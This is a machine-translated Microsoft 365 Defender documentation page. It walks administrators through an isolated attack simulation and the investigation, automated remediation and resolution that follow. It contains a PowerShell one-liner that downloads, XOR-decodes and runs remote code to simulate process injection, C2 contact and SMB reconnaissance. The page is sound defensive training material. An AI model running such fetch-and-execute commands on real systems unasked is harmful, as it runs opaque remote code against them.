---
title: 在 Microsoft 365 Defender 試驗環境中執行攻擊模擬，針對攻擊模擬、回應、修正執行隔離環境
description: 對 Microsoft 365 Defender 執行攻擊模擬，以查看警示和事件的呈現方式、取得洞察力的方式，以及如何快速修正威脅。
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 07/15/2021
ms.locfileid: "53457825"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>在 Microsoft 365 Defender 試驗環境中執行攻擊模擬


本文是使用試驗環境在 Microsoft 365 Defender 中執行事件調查和回應的程式中的[步驟 2](eval-defender-investigate-respond.md) 。 如需此程式的詳細資訊，請參閱 [概述](eval-defender-investigate-respond.md) 文章。

在準備您的[試驗環境](eval-defender-investigate-respond.md)之後，請先使用模擬的攻擊建立事件，並使用 Microsoft 365 Defender 入口網站進行調查和回應，以測試 Microsoft 365 Defender 的事件回應及自動化調查和修正功能。

Microsoft 365 Defender 中的事件是組成攻擊之故事的相關警示和相關資料的集合。

Microsoft 365 服務和應用程式會在偵測到可疑或惡意事件或活動時建立警示。 個別警示可提供關於已完成或進行中攻擊的重要線索。 不過，攻擊一般會針對不同類型的實體（例如裝置、使用者和信箱）採用各種技術。 其結果是針對您租使用者中的多個實體的多個警示。

>[!Note]
>如果您是安全分析和事件回應的新商標，請參閱 [回應您的第一個 incident 演練](first-incident-overview.md) ，以取得一般分析、修正及事件後檢查程式的指導教程。
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>使用 Microsoft 365 Defender 入口網站來模擬攻擊

Microsoft 365 Defender 入口網站具有內建的功能，可在試驗環境中建立模擬攻擊：

- Office 365 的 Microsoft 365 Defender 攻擊模擬訓練 [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) 。
  
  在 Microsoft 365 Defender 入口網站中，選取 [**電子郵件 & 共同作業 > 攻擊模擬訓練**]。

- 針對端點的 Microsoft 365 Defender & 模擬的攻擊教程 [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) 。

  在 Microsoft 365 Defender 入口網站中，選取 [**端點] > 示教 & 模擬**。

### <a name="defender-for-office-365-attack-simulation-training"></a>Office 365 攻擊模擬訓練的 Defender

適用于 Microsoft 365 E5 或 Microsoft defender Office 365 方案2的 Office 365 的 Defender 包含對網路釣魚攻擊的攻擊模擬訓練。 基本步驟如下：

1. 建立模擬

   如需如何建立及傳送新模擬的逐步指示，請參閱 [模擬網路釣魚攻擊](/microsoft-365/security/office-365-security/attack-simulation-training)。

2. 建立有效載荷

   如需如何建立用於類比的負載的逐步指示，請參閱 [建立攻擊模擬訓練的自訂負載](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)。

3. 取得洞察力

   如需如何透過報告取得深入瞭解的逐步指示，請參閱 [透過攻擊模擬訓練取得深入](/microsoft-365/security/office-365-security/attack-simulation-training-insights)瞭解。

如需詳細資訊，請參閱 [模擬](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)。

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>& 模擬的 Defender for Endpoint 進攻教學課程

以下是 Microsoft 的端點模擬的 Defender：

- 檔跌落後門
- 自動化調查 (後門) 

攻擊 IQ 和 SafeBreach 還有其他類比。 此外，還有一組教程。

針對每個類比或教學課程：

1. 下載並閱讀您選取類比或案例中提供的對應流覽檔。

2. 下載類比檔。 您可以選擇在測試裝置上下載檔案或腳本，但這不是必要的。

3. 依照逐步檔中的指示，在測試裝置上執行類比檔或腳本。

 如需詳細資訊，請參閱 [透過模擬攻擊體驗 Microsoft Defender For Endpoint](/microsoft-365/security/defender-endpoint/attack-simulations)。

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>使用獨立的網域控制站和用戶端裝置模擬攻擊 (選用) 

在此選擇性的事件回應練習中，您將會使用 PowerShell 腳本，模擬 (AD DS) 網域控制站和 Windows 10 裝置的隔離 Active Directory 網域服務上的攻擊，然後調查、修正及解決事件。

首先，您必須將端點新增至試驗環境。

### <a name="add-pilot-environment-endpoints"></a>新增試驗環境端點

首先，您必須將隔離的 AD DS 網域控制站和 Windows 10 裝置新增至試驗環境。

1. 請確認您的試驗環境租使用者已[啟用 Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on)。

2. 確認您的網域控制站：

   - 會執行 Windows Server 2008 R2 或更新版本。
   - 報告至 [Microsoft Defender 身分識別](/azure/security-center/security-center-wdatp) ，且已啟用 [遠端系統管理](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。
   - 已啟用[Microsoft Defender 身分識別和 Microsoft Cloud App Security 整合](/cloud-app-security/mdi-integration)。
   - 在測試網域中建立測試使用者。 不需要系統管理員層級的許可權。

3. 確認測試裝置：

   - 會執行 Windows 10 版本1903或更新版本。
   - 已加入 AD DS 網域控制站網域。
   - 已啟用[Windows Defender 防毒軟體](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果您無法啟用 Windows Defender 防毒軟體，請參閱此[疑難排解主題](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
   - [架至 Microsoft Defender For Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

如果您使用租使用者和裝置群組，請為測試裝置建立專用的裝置群組，並將它推至最上層。

另一種方法是將 AD DS 網域控制站和測試裝置裝載為 Microsoft Azure 基礎結構服務中的虛擬機器。 您可以使用 [模擬的企業測試實驗室指南第1階段](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)中的指示，但略過建立 APP1 虛擬機器。

結果如下。

![使用模擬企業測試實驗室指南的 Defender 評估環境端點](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

您將會模擬複雜的攻擊，利用高級技術從偵測中隱藏。 攻擊會在網域控制站上列舉已開啟的伺服器消息區塊 (SMB) 會話，並檢索使用者裝置的最近 IP 位址。 這種攻擊類別通常不會包含在受害者裝置上放入的檔案，而且這些檔案只會發生在記憶體中。 他們會使用現有的系統和系統管理工具，並將其程式碼插入系統進程，以隱藏其執行，以「活在土地外」。 這類行為可讓他們避開偵測，並在裝置上持續。

在此模擬中，我們的範例案例會從 PowerShell 腳本開始。 在現實世界中，使用者可能會欺騙執行腳本，或腳本可能從先前感染的裝置遠端連線至另一部電腦，這表示攻擊者嘗試在網路中移動橫向。 偵測到這些腳本可能很困難，因為系統管理員也經常會以遠端方式執行腳本，以執行各種管理活動。

![Fileless PowerShell 攻擊，處理常式植入和 SMB reconnaisance 攻擊圖表](../../media/mtp/mtpdiydiagram.png)

在模擬過程中，攻擊會將程式碼插入看似合法的程式。 此案例需要使用 notepad.exe。 我們為模擬選擇此程式，但攻擊者很可能是以長期執行的系統進程為目標，例如 svchost.exe。 然後，命令介面會繼續聯繫攻擊者的命令和控制項 (C2) server，以接收如何繼續的指示。 腳本會嘗試對網域控制站執行偵測查詢 (DC) 。 偵測允許攻擊者取得最近使用者登入資訊的相關資訊。 一旦攻擊者取得這項資訊，他們就可以在網路中移動橫向，以取得特定的機密帳戶。

> [!IMPORTANT]
> 為了獲得最佳結果，請盡可能遵循攻擊模擬指示。

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>執行隔離的 AD DS 網域控制站攻擊模擬

若要執行攻擊案例模擬：

1. 確定您的試驗環境包含隔離的 AD DS 網域控制站和 Windows 10 裝置。

2. 使用測試使用者帳戶登入測試裝置。

3. 開啟測試裝置上的 Windows PowerShell 視窗。

4. 複製下列類比腳本：

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > 如果您是在網頁瀏覽器中開啟本文，您可能會在複製完整文字時遇到問題，但不會遺失某些字元或引入額外的分行符號。 如果是這種情況，請下載這份檔，並在 Adobe Reader 上開啟它。

5. 在 [PowerShell] 視窗中貼上並執行複製的腳本。

> [!NOTE]
> 如果您正在使用遠端桌面通訊協定 (RDP) 執行 PowerShell，請使用 RDP 用戶端中的 [輸入剪貼簿文字] 命令，因為 **CTRL + V** 熱鍵或右擊-paste 方法可能無法運作。 最新版本的 PowerShell 有時候也不會接受該方法，您可能必須先將它複製到記憶體中，再複製記事本到虛擬機器中，然後再將其貼到 PowerShell 中。

幾秒後，將會開啟記事本應用程式。 模擬的攻擊程式碼會注入記事本。 將自動產生的記事本實例保持開啟，以體驗整個案例。

模擬的攻擊程式碼會嘗試 (模擬 C2 server) 中的外部 IP 位址進行通訊，然後透過 SMB 嘗試對網域控制站偵測偵測。

當此腳本完成時，您會看到此訊息會顯示在 PowerShell 主控台上：

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

若要查看自動事件和回應功能的動作，請保持 notepad.exe 處理常式開啟。 您將會看到自動化的事件和回應停止記事本處理常式。

### <a name="investigate-the-incident-for-the-simulated-attack"></a>調查模擬攻擊的事件

> [!NOTE]
> 在您完成這項類比之前，請觀看下列影片，查看「事件管理」如何説明您將相關的警示放在一起，以供調查過程使用，您可以在入口網站中找到該程式，以及它如何協助您進行安全性作業：

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

切換至 SOC 分析員的觀點，您現在可以開始調查 Microsoft 365 Defender 入口網站中的攻擊。

1. 開啟[Microsoft 365 Defender 入口網站](https://security.microsoft.com/)。

2. 從功能窗格中，選取 [ **事件] & 警示 > 事件**。

3. 模擬攻擊的新事件會出現在事件佇列中。

    ![事件佇列的範例](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a>以單一事件調查攻擊

Microsoft 365 Defender 相互關聯分析，以及將不同產品的所有相關警示和調查彙集至一個事件實體。 如此一來，Microsoft 365 Defender 會顯示更廣泛的攻擊案例，讓 SOC 分析員能夠瞭解並回應複雜的威脅。

此模擬期間產生的警示會與相同的威脅產生關聯，因此會自動匯總為單一事件。

若要查看此事件：

1. 開啟[Microsoft 365 Defender 入口網站](https://security.microsoft.com/)。

2. 從功能窗格中，選取 [ **事件] & 警示 > 事件**。

3. 按一下事件名稱左側的圓形以選取最新的專案。 側邊面板會顯示有關該事件的其他資訊，包括所有相關的警示。 每個事件都有唯一的名稱，它會根據其包含的警示屬性來描述它。

   儀表板中顯示的警示可根據服務資源進行篩選： microsoft defender for Identity、Microsoft Cloud App Security、microsoft defender for Endpoint、Microsoft 365 Defender 和 microsoft defender for Office 365。

3. 選取 [ **開啟事件] 頁面** ，以取得有關事件的詳細資訊。

   在 [ **事件** ] 頁面中，您可以看到與該事件相關的所有警示和資訊。 此資訊包含警示中所涉及的實體和資產、 (警示的偵測來源，例如 Microsoft Defender for Identity 或 Microsoft Defender for Endpoint) ，以及它們的連結在一起的原因。 檢查事件警示清單會顯示攻擊的進展。 您可以從這個視圖，查看並調查個別提醒。

   您也可以按一下右側功能表中的 [ **管理事件** ]，以標記事件、將其指派給您並新增批註。

#### <a name="review-generated-alerts"></a>審閱產生的提醒

讓我們看一下模擬攻擊期間產生的一些警示。

> [!NOTE]
> 我們只會逐步完成模擬攻擊期間產生的一些警示。 根據測試裝置上所執行 Windows 和 Microsoft 365 Defender 產品的版本，您可能會看到更多以稍有不同順序顯示的警示。

![產生之提醒的範例](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>警示：觀察到的可疑程式注入 (來源： Microsoft Defender for Endpoint) 

高級攻擊者使用複雜且 stealthy 的方法，保存在記憶體中，並從偵測工具隱藏。 其中一項常見的技術是在信任的系統進程中運作，而不是惡意的可執行檔，使偵測工具和安全性作業難以發現惡意的程式碼。

為了讓 SOC 分析員能夠捕捉這些高級攻擊，Microsoft Defender for Endpoint 中的深度記憶體感應器提供我們的雲端服務，具有對各種跨進程程式碼注入技術的空前深入瞭解。 下圖顯示如何在嘗試插入程式碼來 <i>notepad.exe</i>時，如何偵測端點和警示。

![注入潛在惡意程式碼之警示的範例](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>警示：以無命令列引數執行過程所觀察到的意外行為 (來源： Microsoft Defender for Endpoint) 

Microsoft Defender for Endpoint 偵測通常是以最常見的攻擊技術屬性為目標。 此方法可確保持續性並引發此列，以供攻擊者切換至更新的戰術。

我們採用大規模的學習演算法，在組織和全球範圍內建立一般程式的正常行為，並在這些程式顯示反常行為時加以監視。 這些反常行為通常表示已引進無關的程式碼，並在其他受信任的程式中執行。

在此案例中，處理 <i>notepad.exe</i> 會顯示反常的行為，包括與外部位置的通訊。 這項結果獨立于用於引入及執行惡意程式碼的特定方法。

> [!NOTE]
> 因為此警示是以需要其他後端處理的機器學習模型為基礎，所以在入口網站中看到此警示之前可能需要一些時間。

請注意，警示詳細資料包含外部 IP 位址（即您可以做為資料透視以展開調查的指標）。

選取 [警示處理常式] 樹狀目錄中的 IP 位址，以查看 [IP 位址詳細資料] 頁面。

![以無命令列引數執行的程式執行之意外行為的警示範例](../../media/mtp/fig8.png)

下圖顯示 [選取的 IP 位址詳細資料] 頁面 (按一下警示處理樹狀目錄樹) 中的 [IP 位址]。

![IP 位址詳細資料頁面的範例](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>警示：使用者和 IP 位址偵測 (SMB)  (來源： Microsoft Defender 身分識別) 

列舉使用伺服器訊息區 (SMB) 通訊協定，可讓攻擊者取得最近的使用者登入資訊，以協助他們透過網路移動，以存取特定的機密帳戶。

在此偵測中，當 SMB 會話列舉對網域控制站執行時，就會觸發警示。

![使用者和 IP 位址偵測的 Microsoft Defender 身分識別警示範例](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>使用 Microsoft Defender for Endpoint 審閱裝置時程表

在探索此事件中的各種警示後，請移回先前所調查的 [事件] 頁面。 在 [事件] 頁面中，選取 [ **裝置** ] 索引標籤，以複查此事件中與 microsoft Defender for Endpoint 和 microsoft Defender 身分識別報告相關的裝置。

選取實施攻擊的裝置名稱，以開啟該特定裝置的實體頁面。 在該頁面中，您可以看到觸發和相關事件的警示。

選取 [ **時程表** ] 索引標籤以開啟裝置時程表，並以時間順序查看裝置上觀測到的所有事件和行為，並與所引發的警示交錯。

![包含行為之裝置時程表的範例](../../media/mtp/fig11.png)

展開一些較為有趣的行為，可提供有用的詳細資料，例如處理樹。

例如，向下滾動，直到發現出現警示事件 **可疑程式注入**。 選取 **插入的powershell.exe** ，以 notepad.exe 它底下的處理程式事件，在側邊窗格的 [ **事件實體** ] 圖表下，顯示此行為的完整處理樹狀結構。 如有必要，請使用搜尋列進行篩選。

![選取的 PowerShell 檔案建立行為的進程樹狀結構範例](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a>使用 Microsoft Cloud App Security 審閱使用者資訊

在 [事件] 頁面上，選取 [ **使用者** ] 索引標籤，以顯示攻擊相關的使用者清單。 該表包含每個使用者的詳細資訊，包括每個使用者的 **調查優先順序** 分數。

選取 [使用者名稱]，以開啟可以進行進一步調查的使用者設定檔頁面。 [閱讀有關調查危險使用者的詳細資訊](/cloud-app-security/tutorial-ueba#identify)。

![雲端 App 安全性使用者頁面的範例](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a>自動化調查與補救措施

> [!NOTE]
>在進行這項模擬之前，請觀看下列影片，瞭解自動自我修復功能的相關資訊，以及如何在入口網站中找到它，以及如何協助您進行安全性作業：

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

在 Microsoft 365 Defender 入口網站中，向後流覽至該事件。 [**事件**] 頁面中的 [**調查**] 索引標籤會顯示 microsoft Defender 身分識別和 microsoft defender for Endpoint 所觸發的自動調查。 下列螢幕擷取畫面只會顯示由 Defender for Endpoint 所觸發的自動調查。 依預設，Defender for Endpoint 會自動 remediates 在佇列中找到的專案，這需要進行修復。

![與事件相關之自動化調查的範例](../../media/mtp/fig14.png)

選取觸發調查的警示，以開啟 [ **調查詳細資料** ] 頁面。 您將會看到下列詳細資料：

- 觸發自動調查的警示 (s) 。
- 受影響的使用者和裝置。 如果在其他裝置上找到指示器，也會列出這些額外裝置。
- 證據清單。 找到並分析的實體，例如檔案、進程、服務、驅動程式和網路位址。 這些實體會進行分析，以取得警示的可能關係，並評為良性或惡意。
- 發現威脅。 調查期間找到的已知威脅。

> [!NOTE]
> 根據時間的不同，自動調查可能仍在執行中。 在您收集及分析證據並檢查結果之前，請等候幾分鐘完成處理常式。 重新整理「 **調查詳細資料** 」頁面以取得最新的結果。

![調查詳細資料頁面的範例](../../media/mtp/fig15.png)

在自動調查期間，Microsoft Defender for Endpoint 會識別出 notepad.exe 的處理常式，並將其注入為需要修正的其中一個專案。 Defender for Endpoint 會自動停止可疑的程式注入做為自動修復的一部分。

您可以在測試裝置上看到 [已執行的程式] 清單中 <i>notepad.exe</i> 會消失。

#### <a name="resolve-the-incident"></a>解決事件

調查完成並確認待修正後，即可解決事件。

在 [ **事件** ] 頁面中，選取 [ **管理事件**]。 設定狀態以 **解決事件**，並針對確定的分類及 **安全性測試** 選取 **True 警示**。

![「事件」頁面的範例，具有「開啟管理事件」面板，您可以在其中按一下參數來解決事件](../../media/mtp/fig16.png)

當事件解決時，它會在 Microsoft 365 Defender 入口網站和相關的入口網站中解析所有相關聯的警示。

這會針對事件分析、自動調查和事件解決等問題，進行攻擊模擬。

## <a name="next-step"></a>後續步驟

[![嘗試 Microsoft 365 Defender 事件回應功能](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)

步驟2之2：[嘗試 Microsoft 365 Defender 事件回應功能](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>您可能需要的導覽

[建立 Microsoft 365 Defender 評估環境](eval-create-eval-environment.md)
